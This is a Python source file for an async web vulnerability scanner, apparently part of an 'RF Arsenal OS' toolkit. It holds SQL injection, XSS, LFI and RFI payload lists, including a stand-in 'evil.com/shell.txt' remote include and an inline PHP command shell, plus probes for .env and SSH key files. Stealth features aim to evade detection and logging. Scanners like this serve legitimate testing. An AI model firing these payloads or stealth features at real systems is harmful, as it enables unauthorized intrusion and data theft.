#!/usr/bin/env python3
"""
RF Arsenal OS - Web Application Scanner
=======================================

Professional web application vulnerability scanner with stealth-first design.
Supports SQLi, XSS, CSRF, LFI/RFI, directory enumeration, and API fuzzing.

STEALTH FEATURES:
- Randomized request timing
- User-Agent rotation
- Proxy chain support
- Request fingerprint obfuscation
- RAM-only results storage

Author: RF Arsenal Security Team
License: Authorized Use Only
"""

import asyncio
import aiohttp
import hashlib
import html
import json
import logging
import os
import random
import re
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from collections import defaultdict

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of web vulnerabilities"""
    SQLI = "sql_injection"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    CSRF = "csrf"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    SSRF = "server_side_request_forgery"
    XXE = "xml_external_entity"
    IDOR = "insecure_direct_object_reference"
    OPEN_REDIRECT = "open_redirect"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    INFO_DISCLOSURE = "information_disclosure"
    SENSITIVE_DATA = "sensitive_data_exposure"
    DIRECTORY_LISTING = "directory_listing"
    BACKUP_FILE = "backup_file"
    CONFIG_EXPOSURE = "config_exposure"
    API_ENDPOINT = "api_endpoint"
    CORS_MISCONFIGURATION = "cors_misconfiguration"
    HEADER_INJECTION = "header_injection"
    CRLF_INJECTION = "crlf_injection"


class SeverityLevel(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "informational"


@dataclass
class Vulnerability:
    """Detected vulnerability"""
    vuln_type: VulnerabilityType
    severity: SeverityLevel
    url: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    description: str = ""
    remediation: str = ""
    confidence: float = 0.0
    timestamp: datetime = field(default_factory=datetime.now)
    request: Optional[str] = None
    response: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for export"""
        return {
            'type': self.vuln_type.value,
            'severity': self.severity.value,
            'url': self.url,
            'parameter': self.parameter,
            'payload': self.payload,
            'evidence': self.evidence[:500] if self.evidence else None,
            'description': self.description,
            'remediation': self.remediation,
            'confidence': self.confidence,
            'timestamp': self.timestamp.isoformat(),
        }


@dataclass
class ScanConfig:
    """Web scanner configuration"""
    # Target settings
    target_url: str
    scope_domains: List[str] = field(default_factory=list)
    exclude_patterns: List[str] = field(default_factory=list)
    
    # Scan settings
    max_depth: int = 3
    max_pages: int = 100
    threads: int = 10
    timeout: float = 10.0
    
    # Stealth settings
    delay_min: float = 0.5
    delay_max: float = 2.0
    randomize_timing: bool = True
    rotate_user_agents: bool = True
    use_proxy: bool = False
    proxy_url: Optional[str] = None
    
    # Scan modules
    scan_sqli: bool = True
    scan_xss: bool = True
    scan_csrf: bool = True
    scan_lfi: bool = True
    scan_rfi: bool = True
    scan_ssrf: bool = True
    scan_directories: bool = True
    scan_apis: bool = True
    scan_headers: bool = True
    
    # Advanced
    follow_redirects: bool = True
    verify_ssl: bool = False
    custom_headers: Dict[str, str] = field(default_factory=dict)
    custom_cookies: Dict[str, str] = field(default_factory=dict)
    auth_type: Optional[str] = None  # basic, bearer, cookie
    auth_credentials: Optional[str] = None


class WebScanner:
    """
    Professional Web Application Vulnerability Scanner
    
    Features:
    - SQL Injection detection (error-based, blind, time-based)
    - XSS detection (reflected, stored, DOM-based)
    - CSRF vulnerability detection
    - Local/Remote File Inclusion
    - Directory/file enumeration
    - API endpoint discovery
    - Stealth operation with proxy support
    
    STEALTH COMPLIANCE:
    - All results stored in RAM only
    - No persistent logging
    - Proxy chain support for anonymity
    - Request fingerprint randomization
    """
    
    # Common User-Agents for rotation
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    ]
    
    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)",
        "' OR SLEEP(5)#",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "admin'--",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1--",
    ]
    
    # SQL error patterns
    SQLI_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"ORA-\d{5}",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Microsoft.*ODBC.*SQL Server",
        r"SQLServer.*Driver",
        r"SQLite.*Error",
        r"sqlite3.OperationalError",
        r"SQLSTATE\[\d+\]",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
    ]
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<a href=\"javascript:alert('XSS')\">click</a>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
    ]
    
    # LFI payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        r"....\/....\/....\/etc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "file:///etc/passwd",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
    ]
    
    # RFI payloads (use with caution)
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "//evil.com/shell.txt",
        "data://text/plain,<?php system($_GET['cmd']); ?>",
    ]
    
    # Common directories to enumerate
    COMMON_DIRS = [
        "admin", "administrator", "login", "wp-admin", "wp-login.php",
        "cpanel", "phpmyadmin", "webmail", "api", "api/v1", "api/v2",
        "backup", "backups", "bak", "old", "temp", "tmp", "test",
        "dev", "development", "staging", "config", "conf", "etc",
        ".git", ".svn", ".htaccess", ".htpasswd", ".env", ".DS_Store",
        "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
        "server-status", "server-info", "phpinfo.php", "info.php",
        "wp-content", "wp-includes", "includes", "inc", "lib",
        "uploads", "upload", "files", "images", "img", "assets",
        "static", "media", "data", "database", "db", "sql",
        "logs", "log", "debug", "trace", "error", "errors",
    ]
    
    # Common backup extensions
    BACKUP_EXTENSIONS = [
        ".bak", ".backup", ".old", ".orig", ".save", ".swp",
        ".tmp", "~", ".copy", ".1", ".2", "_backup",
    ]
    
    # Sensitive file patterns
    SENSITIVE_FILES = [
        "web.config", "config.php", "config.inc.php", "database.yml",
        "settings.py", "local_settings.py", "secrets.yml", "credentials.xml",
        ".env", ".env.local", ".env.production", ".env.development",
        "id_rsa", "id_dsa", ".ssh/authorized_keys", ".bash_history",
        "wp-config.php", "configuration.php", "LocalSettings.php",
    ]
    
    def __init__(self, config: Optional[ScanConfig] = None):
        """Initialize web scanner"""
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        self.vulnerabilities: List[Vulnerability] = []
        self.scanned_urls: Set[str] = set()
        self.discovered_urls: Set[str] = set()
        self.discovered_forms: List[Dict] = []
        self.discovered_apis: List[str] = []
        self.scan_stats = defaultdict(int)
        self._running = False
        self._lock = asyncio.Lock()
        
        logger.info("WebScanner initialized - RAM-only operation")
    
    def _get_random_user_agent(self) -> str:
        """Get random User-Agent for stealth"""
        return random.choice(self.USER_AGENTS)
    
    def _get_headers(self) -> Dict[str, str]:
        """Get request headers with stealth options"""
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        
        if self.config and self.config.rotate_user_agents:
            headers["User-Agent"] = self._get_random_user_agent()
        else:
            headers["User-Agent"] = self.USER_AGENTS[0]
        
        if self.config and self.config.custom_headers:
            headers.update(self.config.custom_headers)
        
        return headers
    
    async def _delay(self):
        """Apply randomized delay for stealth"""
        if self.config and self.config.randomize_timing:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            await asyncio.sleep(delay)
    
    async def _make_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        allow_redirects: bool = True,
    ) -> Tuple[Optional[int], Optional[str], Optional[Dict]]:
        """
        Make HTTP request with stealth features
        
        Returns: (status_code, response_text, response_headers)
        """
        await self._delay()
        
        request_headers = self._get_headers()
        if headers:
            request_headers.update(headers)
        
        try:
            ssl_context = ssl.create_default_context()
            if self.config and not self.config.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            connector = aiohttp.TCPConnector(ssl=ssl_context)
            
            timeout = aiohttp.ClientTimeout(
                total=self.config.timeout if self.config else 10.0
            )
            
            # Configure proxy if enabled
            proxy = None
            if self.config and self.config.use_proxy and self.config.proxy_url:
                proxy = self.config.proxy_url
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=request_headers,
            ) as session:
                if method.upper() == "GET":
                    async with session.get(
                        url,
                        allow_redirects=allow_redirects,
                        proxy=proxy,
                    ) as response:
                        text = await response.text()
                        return response.status, text, dict(response.headers)
                        
                elif method.upper() == "POST":
                    async with session.post(
                        url,
                        data=data,
                        allow_redirects=allow_redirects,
                        proxy=proxy,
                    ) as response:
                        text = await response.text()
                        return response.status, text, dict(response.headers)
                        
        except asyncio.TimeoutError:
            self.scan_stats['timeouts'] += 1
            return None, None, None
        except aiohttp.ClientError as e:
            self.scan_stats['errors'] += 1
            logger.debug(f"Request error: {e}")
            return None, None, None
        except Exception as e:
            self.scan_stats['errors'] += 1
            logger.debug(f"Unexpected error: {e}")
            return None, None, None
    
    async def scan(self, target_url: str, config: Optional[ScanConfig] = None) -> List[Vulnerability]:
        """
        Run full vulnerability scan on target
        
        Args:
            target_url: Target URL to scan
            config: Optional scan configuration
            
        Returns:
            List of discovered vulnerabilities
        """
        if config:
            self.config = config
        elif not self.config:
            self.config = ScanConfig(target_url=target_url)
        
        self.config.target_url = target_url
        self._running = True
        self.vulnerabilities = []
        self.scanned_urls = set()
        self.discovered_urls = {target_url}
        
        logger.info(f"Starting web scan on: {target_url}")
        
        try:
            # Phase 1: Crawl and discover
            await self._crawl_target()
            
            # Phase 2: Run vulnerability checks
            tasks = []
            
            for url in list(self.discovered_urls)[:self.config.max_pages]:
                if self.config.scan_sqli:
                    tasks.append(self._test_sqli(url))
                if self.config.scan_xss:
                    tasks.append(self._test_xss(url))
                if self.config.scan_lfi:
                    tasks.append(self._test_lfi(url))
                if self.config.scan_headers:
                    tasks.append(self._test_headers(url))
            
            if self.config.scan_directories:
                tasks.append(self._enumerate_directories())
            
            if self.config.scan_apis:
                tasks.append(self._discover_apis())
            
            # Run all tasks with concurrency limit
            semaphore = asyncio.Semaphore(self.config.threads)
            
            async def limited_task(task):
                async with semaphore:
                    return await task
            
            await asyncio.gather(*[limited_task(t) for t in tasks], return_exceptions=True)
            
        except Exception as e:
            logger.error(f"Scan error: {e}")
        finally:
            self._running = False
        
        logger.info(f"Scan complete. Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities
    
    async def _crawl_target(self):
        """Crawl target to discover URLs and forms"""
        to_crawl = [self.config.target_url]
        crawled = set()
        depth = 0
        
        while to_crawl and depth < self.config.max_depth:
            current_batch = to_crawl[:50]
            to_crawl = to_crawl[50:]
            
            for url in current_batch:
                if url in crawled:
                    continue
                crawled.add(url)
                
                status, html_content, headers = await self._make_request(url)
                if not html_content:
                    continue
                
                self.scan_stats['pages_crawled'] += 1
                
                # Extract links
                links = self._extract_links(url, html_content)
                for link in links:
                    if self._is_in_scope(link) and link not in crawled:
                        to_crawl.append(link)
                        self.discovered_urls.add(link)
                
                # Extract forms
                forms = self._extract_forms(url, html_content)
                self.discovered_forms.extend(forms)
            
            depth += 1
    
    def _extract_links(self, base_url: str, html_content: str) -> List[str]:
        """Extract links from HTML"""
        links = []
        
        # Find href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        for match in re.finditer(href_pattern, html_content, re.IGNORECASE):
            link = match.group(1)
            absolute_url = urllib.parse.urljoin(base_url, link)
            links.append(absolute_url)
        
        # Find src attributes
        src_pattern = r'src=["\']([^"\']+)["\']'
        for match in re.finditer(src_pattern, html_content, re.IGNORECASE):
            link = match.group(1)
            absolute_url = urllib.parse.urljoin(base_url, link)
            links.append(absolute_url)
        
        return list(set(links))
    
    def _extract_forms(self, base_url: str, html_content: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        
        form_pattern = r'<form[^>]*>(.*?)</form>'
        for match in re.finditer(form_pattern, html_content, re.IGNORECASE | re.DOTALL):
            form_html = match.group(0)
            form_data = {
                'url': base_url,
                'action': '',
                'method': 'GET',
                'inputs': []
            }
            
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if action_match:
                form_data['action'] = urllib.parse.urljoin(base_url, action_match.group(1))
            else:
                form_data['action'] = base_url
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
            if method_match:
                form_data['method'] = method_match.group(1).upper()
            
            # Extract inputs
            input_pattern = r'<input[^>]*>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_tag = input_match.group(0)
                
                input_data = {'type': 'text', 'name': '', 'value': ''}
                
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                if type_match:
                    input_data['type'] = type_match.group(1)
                
                name_match = re.search(r'name=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                if name_match:
                    input_data['name'] = name_match.group(1)
                
                value_match = re.search(r'value=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                if value_match:
                    input_data['value'] = value_match.group(1)
                
                if input_data['name']:
                    form_data['inputs'].append(input_data)
            
            # Extract textareas
            textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
            for ta_match in re.finditer(textarea_pattern, form_html, re.IGNORECASE):
                form_data['inputs'].append({
                    'type': 'textarea',
                    'name': ta_match.group(1),
                    'value': ''
                })
            
            forms.append(form_data)
        
        return forms
    
    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is in scan scope"""
        parsed = urllib.parse.urlparse(url)
        
        # Check against base URL
        base_parsed = urllib.parse.urlparse(self.config.target_url)
        if parsed.netloc != base_parsed.netloc:
            if self.config.scope_domains:
                if not any(d in parsed.netloc for d in self.config.scope_domains):
                    return False
            else:
                return False
        
        # Check exclude patterns
        for pattern in self.config.exclude_patterns:
            if re.search(pattern, url):
                return False
        
        return True
    
    async def _test_sqli(self, url: str):
        """Test for SQL injection vulnerabilities"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param, values in params.items():
            original_value = values[0] if values else ""
            
            for payload in self.SQLI_PAYLOADS[:10]:  # Limit payloads for stealth
                # Build test URL
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                status, response, headers = await self._make_request(test_url)
                if not response:
                    continue
                
                self.scan_stats['sqli_tests'] += 1
                
                # Check for SQL errors
                for error_pattern in self.SQLI_ERRORS:
                    if re.search(error_pattern, response, re.IGNORECASE):
                        vuln = Vulnerability(
                            vuln_type=VulnerabilityType.SQLI,
                            severity=SeverityLevel.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=re.search(error_pattern, response, re.IGNORECASE).group(0),
                            description=f"SQL Injection vulnerability detected in parameter '{param}'",
                            remediation="Use parameterized queries or prepared statements",
                            confidence=0.9,
                        )
                        await self._add_vulnerability(vuln)
                        return  # Found SQLi, no need to test more payloads
        
        # Test forms for SQLi
        for form in self.discovered_forms:
            if form['url'] == url:
                await self._test_form_sqli(form)
    
    async def _test_form_sqli(self, form: Dict):
        """Test form for SQL injection"""
        for input_field in form['inputs']:
            if input_field['type'] in ['hidden', 'submit', 'button']:
                continue
            
            for payload in self.SQLI_PAYLOADS[:5]:
                form_data = {}
                for inp in form['inputs']:
                    if inp['name'] == input_field['name']:
                        form_data[inp['name']] = payload
                    else:
                        form_data[inp['name']] = inp.get('value', 'test')
                
                status, response, headers = await self._make_request(
                    form['action'],
                    method=form['method'],
                    data=form_data,
                )
                
                if not response:
                    continue
                
                for error_pattern in self.SQLI_ERRORS:
                    if re.search(error_pattern, response, re.IGNORECASE):
                        vuln = Vulnerability(
                            vuln_type=VulnerabilityType.SQLI,
                            severity=SeverityLevel.CRITICAL,
                            url=form['action'],
                            parameter=input_field['name'],
                            payload=payload,
                            evidence=re.search(error_pattern, response, re.IGNORECASE).group(0),
                            description=f"SQL Injection in form field '{input_field['name']}'",
                            remediation="Use parameterized queries",
                            confidence=0.9,
                        )
                        await self._add_vulnerability(vuln)
                        return
    
    async def _test_xss(self, url: str):
        """Test for XSS vulnerabilities"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        # Generate unique marker
        xss_marker = f"XSS{random.randint(10000, 99999)}"
        
        for param, values in params.items():
            for payload_template in self.XSS_PAYLOADS[:8]:
                payload = payload_template.replace("XSS", xss_marker)
                
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                status, response, headers = await self._make_request(test_url)
                if not response:
                    continue
                
                self.scan_stats['xss_tests'] += 1
                
                # Check if payload is reflected
                if payload in response or xss_marker in response:
                    # Check if it's in a dangerous context
                    if self._is_xss_exploitable(response, payload):
                        vuln = Vulnerability(
                            vuln_type=VulnerabilityType.XSS_REFLECTED,
                            severity=SeverityLevel.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=f"Payload reflected in response",
                            description=f"Reflected XSS in parameter '{param}'",
                            remediation="Implement proper output encoding and Content-Security-Policy",
                            confidence=0.85,
                        )
                        await self._add_vulnerability(vuln)
                        return
    
    def _is_xss_exploitable(self, response: str, payload: str) -> bool:
        """Check if XSS payload is in exploitable context"""
        # Check if payload is inside script tags or event handlers
        dangerous_contexts = [
            f'<script>{payload}',
            f'<script type="text/javascript">{payload}',
            f'onerror="{payload}"',
            f"onerror='{payload}'",
            f'onload="{payload}"',
            f"onload='{payload}'",
            f'href="javascript:{payload}"',
        ]
        
        for context in dangerous_contexts:
            if context.lower() in response.lower():
                return True
        
        # Check if angle brackets are not encoded
        if '<script>' in payload and '<script>' in response:
            return True
        
        return False
    
    async def _test_lfi(self, url: str):
        """Test for Local File Inclusion"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        # Look for file-related parameters
        file_params = ['file', 'page', 'path', 'include', 'template', 'doc', 'document', 'folder', 'root', 'pg']
        
        for param, values in params.items():
            # Check if parameter name suggests file handling
            is_file_param = any(fp in param.lower() for fp in file_params)
            
            for payload in self.LFI_PAYLOADS[:6]:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                status, response, headers = await self._make_request(test_url)
                if not response:
                    continue
                
                self.scan_stats['lfi_tests'] += 1
                
                # Check for /etc/passwd content
                if 'root:' in response and '/bin/' in response:
                    vuln = Vulnerability(
                        vuln_type=VulnerabilityType.LFI,
                        severity=SeverityLevel.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="File content retrieved: /etc/passwd",
                        description=f"Local File Inclusion in parameter '{param}'",
                        remediation="Validate and sanitize file paths, use allowlists",
                        confidence=0.95,
                    )
                    await self._add_vulnerability(vuln)
                    return
                
                # Check for Windows SAM hints
                if 'Administrator' in response and 'SYSTEM' in response:
                    vuln = Vulnerability(
                        vuln_type=VulnerabilityType.LFI,
                        severity=SeverityLevel.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Windows system file content detected",
                        description=f"Local File Inclusion in parameter '{param}'",
                        remediation="Validate and sanitize file paths",
                        confidence=0.9,
                    )
                    await self._add_vulnerability(vuln)
                    return
    
    async def _test_headers(self, url: str):
        """Test security headers and configurations"""
        status, response, headers = await self._make_request(url)
        if not headers:
            return
        
        self.scan_stats['header_tests'] += 1
        
        # Check missing security headers
        security_headers = {
            'X-Frame-Options': ('Missing X-Frame-Options header', SeverityLevel.MEDIUM),
            'X-Content-Type-Options': ('Missing X-Content-Type-Options header', SeverityLevel.LOW),
            'X-XSS-Protection': ('Missing X-XSS-Protection header', SeverityLevel.LOW),
            'Content-Security-Policy': ('Missing Content-Security-Policy header', SeverityLevel.MEDIUM),
            'Strict-Transport-Security': ('Missing HSTS header', SeverityLevel.MEDIUM),
        }
        
        headers_lower = {k.lower(): v for k, v in headers.items()}
        
        for header, (desc, severity) in security_headers.items():
            if header.lower() not in headers_lower:
                vuln = Vulnerability(
                    vuln_type=VulnerabilityType.INFO_DISCLOSURE,
                    severity=severity,
                    url=url,
                    description=desc,
                    remediation=f"Add {header} header to responses",
                    confidence=1.0,
                )
                await self._add_vulnerability(vuln)
        
        # Check for server header disclosure
        if 'server' in headers_lower:
            server = headers_lower['server']
            if any(v in server.lower() for v in ['apache', 'nginx', 'iis', 'php']):
                vuln = Vulnerability(
                    vuln_type=VulnerabilityType.INFO_DISCLOSURE,
                    severity=SeverityLevel.LOW,
                    url=url,
                    evidence=f"Server: {server}",
                    description="Server version disclosure",
                    remediation="Remove or obfuscate Server header",
                    confidence=1.0,
                )
                await self._add_vulnerability(vuln)
        
        # Check CORS configuration
        if 'access-control-allow-origin' in headers_lower:
            cors_value = headers_lower['access-control-allow-origin']
            if cors_value == '*':
                vuln = Vulnerability(
                    vuln_type=VulnerabilityType.CORS_MISCONFIGURATION,
                    severity=SeverityLevel.MEDIUM,
                    url=url,
                    evidence=f"Access-Control-Allow-Origin: *",
                    description="Overly permissive CORS configuration",
                    remediation="Restrict CORS to specific trusted domains",
                    confidence=1.0,
                )
                await self._add_vulnerability(vuln)
    
    async def _enumerate_directories(self):
        """Enumerate common directories and files"""
        base_url = self.config.target_url.rstrip('/')
        
        for directory in self.COMMON_DIRS:
            test_url = f"{base_url}/{directory}"
            status, response, headers = await self._make_request(test_url)
            
            self.scan_stats['dir_tests'] += 1
            
            if status == 200:
                # Check for directory listing
                if '<title>Index of' in str(response) or 'Parent Directory' in str(response):
                    vuln = Vulnerability(
                        vuln_type=VulnerabilityType.DIRECTORY_LISTING,
                        severity=SeverityLevel.MEDIUM,
                        url=test_url,
                        description=f"Directory listing enabled: {directory}",
                        remediation="Disable directory listing in web server configuration",
                        confidence=0.95,
                    )
                    await self._add_vulnerability(vuln)
                
                # Check for sensitive files
                if directory in ['.env', 'web.config', 'config.php', '.git']:
                    vuln = Vulnerability(
                        vuln_type=VulnerabilityType.SENSITIVE_DATA,
                        severity=SeverityLevel.HIGH,
                        url=test_url,
                        description=f"Sensitive file exposed: {directory}",
                        remediation="Remove or protect sensitive files",
                        confidence=0.9,
                    )
                    await self._add_vulnerability(vuln)
            
            elif status == 403:
                # Forbidden might indicate the resource exists
                self.discovered_urls.add(test_url)
    
    async def _discover_apis(self):
        """Discover API endpoints"""
        base_url = self.config.target_url.rstrip('/')
        
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/graphql', '/swagger', '/swagger.json',
            '/openapi.json', '/api-docs', '/docs/api',
            '/v1', '/v2', '/.well-known',
        ]
        
        for path in api_paths:
            test_url = f"{base_url}{path}"
            status, response, headers = await self._make_request(test_url)
            
            if status == 200:
                self.discovered_apis.append(test_url)
                
                # Check for Swagger/OpenAPI exposure
                if 'swagger' in path or 'openapi' in path:
                    if response and ('swagger' in response.lower() or 'openapi' in response.lower()):
                        vuln = Vulnerability(
                            vuln_type=VulnerabilityType.API_ENDPOINT,
                            severity=SeverityLevel.MEDIUM,
                            url=test_url,
                            description="API documentation exposed",
                            remediation="Protect API documentation in production",
                            confidence=0.9,
                        )
                        await self._add_vulnerability(vuln)
                
                # Check for GraphQL introspection
                if 'graphql' in path.lower():
                    await self._test_graphql(test_url)
    
    async def _test_graphql(self, url: str):
        """Test GraphQL endpoint for introspection"""
        introspection_query = {
            "query": "{ __schema { types { name } } }"
        }
        
        status, response, headers = await self._make_request(
            url,
            method="POST",
            data=json.dumps(introspection_query),
            headers={"Content-Type": "application/json"}
        )
        
        if response and '__schema' in response:
            vuln = Vulnerability(
                vuln_type=VulnerabilityType.API_ENDPOINT,
                severity=SeverityLevel.MEDIUM,
                url=url,
                description="GraphQL introspection enabled",
                remediation="Disable introspection in production",
                confidence=0.95,
            )
            await self._add_vulnerability(vuln)
    
    async def _add_vulnerability(self, vuln: Vulnerability):
        """Add vulnerability to results (thread-safe)"""
        async with self._lock:
            # Check for duplicates
            for existing in self.vulnerabilities:
                if (existing.vuln_type == vuln.vuln_type and 
                    existing.url == vuln.url and 
                    existing.parameter == vuln.parameter):
                    return
            
            self.vulnerabilities.append(vuln)
            self.scan_stats['vulnerabilities'] += 1
            logger.info(f"[{vuln.severity.value.upper()}] {vuln.vuln_type.value}: {vuln.url}")
    
    def get_scan_stats(self) -> Dict[str, Any]:
        """Get scan statistics"""
        return {
            'pages_crawled': self.scan_stats['pages_crawled'],
            'urls_discovered': len(self.discovered_urls),
            'forms_discovered': len(self.discovered_forms),
            'apis_discovered': len(self.discovered_apis),
            'vulnerabilities_found': len(self.vulnerabilities),
            'tests_run': {
                'sqli': self.scan_stats['sqli_tests'],
                'xss': self.scan_stats['xss_tests'],
                'lfi': self.scan_stats['lfi_tests'],
                'directories': self.scan_stats['dir_tests'],
                'headers': self.scan_stats['header_tests'],
            },
            'errors': self.scan_stats['errors'],
            'timeouts': self.scan_stats['timeouts'],
        }
    
    def get_report(self, format: str = "json") -> str:
        """
        Generate scan report
        
        Args:
            format: Report format (json, text)
            
        Returns:
            Report string
        """
        if format == "json":
            report = {
                'target': self.config.target_url if self.config else None,
                'scan_time': datetime.now().isoformat(),
                'statistics': self.get_scan_stats(),
                'vulnerabilities': [v.to_dict() for v in self.vulnerabilities],
            }
            return json.dumps(report, indent=2)
        
        else:  # text format
            lines = [
                "=" * 60,
                "RF ARSENAL OS - WEB VULNERABILITY SCAN REPORT",
                "=" * 60,
                f"Target: {self.config.target_url if self.config else 'N/A'}",
                f"Scan Time: {datetime.now().isoformat()}",
                "",
                "STATISTICS:",
                f"  Pages Crawled: {self.scan_stats['pages_crawled']}",
                f"  URLs Discovered: {len(self.discovered_urls)}",
                f"  Vulnerabilities Found: {len(self.vulnerabilities)}",
                "",
                "VULNERABILITIES:",
                "-" * 40,
            ]
            
            # Group by severity
            by_severity = defaultdict(list)
            for vuln in self.vulnerabilities:
                by_severity[vuln.severity].append(vuln)
            
            for severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH, 
                           SeverityLevel.MEDIUM, SeverityLevel.LOW, SeverityLevel.INFO]:
                if severity in by_severity:
                    lines.append(f"\n[{severity.value.upper()}]")
                    for vuln in by_severity[severity]:
                        lines.append(f"  - {vuln.vuln_type.value}: {vuln.url}")
                        if vuln.parameter:
                            lines.append(f"    Parameter: {vuln.parameter}")
                        if vuln.description:
                            lines.append(f"    {vuln.description}")
            
            lines.append("")
            lines.append("=" * 60)
            
            return "\n".join(lines)
    
    def stop(self):
        """Stop running scan"""
        self._running = False
    
    def clear_results(self):
        """Clear all results from RAM"""
        self.vulnerabilities = []
